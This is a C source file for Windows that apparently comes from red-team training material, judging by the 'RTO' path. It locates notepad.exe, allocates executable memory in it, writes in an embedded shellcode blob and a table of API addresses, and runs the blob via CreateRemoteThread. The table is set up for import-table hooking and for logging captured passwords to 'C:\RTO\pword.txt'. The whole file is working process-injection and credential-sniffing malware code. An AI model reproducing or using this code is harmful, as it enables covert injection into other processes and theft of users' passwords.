#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <TlHelp32.h>

#include <stdio.h>

#include "migrate.bin.h"

typedef struct _sniff_data
{
    DWORD64 dwGetModuleHandleA;
    DWORD64 dwLoadLibraryA;
    DWORD64 dwImageDirectoryEntryToDataEx;
    DWORD64 dwVirtualProtect;
    DWORD64 dwFuncAddrPage;
    DWORD64 dwHookedFuncMem;
    DWORD64 dwWideCharToMultiByte;
    DWORD64 dwCreateFile;
    DWORD64 dwWriteFile;
    DWORD64 dwCloseHandle;
    CHAR cPwordFilePath[MAX_PATH];
} SNIFF_DATA, *PSNIFF_DATA;

#define MIGRATE_DATA_SIZE 44

DWORD FindTargetPID(LPSTR lpProcName)
{
    DWORD dwRetVal = -1;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 pe = {.dwSize = sizeof(pe)};
    if (!Process32First(hSnapshot, &pe))
    {
        return dwRetVal;
    }

    do
    {
        if (strcmp(lpProcName, pe.szExeFile) == 0)
        {
            return pe.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe));

    return dwRetVal;
}

int main(void)
{
    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwTargetPID = FindTargetPID("notepad.exe");
    HANDLE hTargetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPID);
    LPVOID lpvMigrateMem = VirtualAllocEx(hTargetProc, 0, migrate_len + MIGRATE_DATA_SIZE + sizeof(SNIFF_DATA), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hTargetProc, lpvMigrateMem, migrate, migrate_len, NULL);

    HMODULE hKernel32 = GetModuleHandleA("kernel32");
    HMODULE hDbgHelp = LoadLibraryA("dbgHelp");

    SNIFF_DATA sniff_data;
    sniff_data.dwGetModuleHandleA = (DWORD64)GetProcAddress(hKernel32, "GetModuleHandleA");
    sniff_data.dwLoadLibraryA = (DWORD64)GetProcAddress(hKernel32, "LoadLibraryA");
    sniff_data.dwImageDirectoryEntryToDataEx = (DWORD64)GetProcAddress(hDbgHelp, "ImageDirectoryEntryToDataEx");
    sniff_data.dwVirtualProtect = (DWORD64)GetProcAddress(hKernel32, "VirtualProtect");
    sniff_data.dwWideCharToMultiByte = (DWORD64)GetProcAddress(hKernel32, "WideCharToMultiByte");
    sniff_data.dwCreateFile = (DWORD64)GetProcAddress(hKernel32, "CreateFileA");
    sniff_data.dwWriteFile = (DWORD64)GetProcAddress(hKernel32, "WriteFile");
    sniff_data.dwCloseHandle = (DWORD64)GetProcAddress(hKernel32, "CloseHandle");
    strcpy_s(sniff_data.cPwordFilePath, MAX_PATH, "C:\\RTO\\pword.txt");

    DWORD32 dwSniffDataSize = sizeof(sniff_data);
    WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvMigrateMem + migrate_len + MIGRATE_DATA_SIZE), &dwSniffDataSize, sizeof(dwSniffDataSize), NULL);
    WriteProcessMemory(hTargetProc, (LPVOID)((ULONG_PTR)lpvMigrateMem + migrate_len + MIGRATE_DATA_SIZE + sizeof(dwSniffDataSize)), &sniff_data, sizeof(sniff_data), NULL);

    HANDLE hThread = CreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvMigrateMem, NULL, 0, NULL);

    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hTargetProc, lpvMigrateMem, 0, MEM_RELEASE);
    CloseHandle(hTargetProc);

    return 0;
}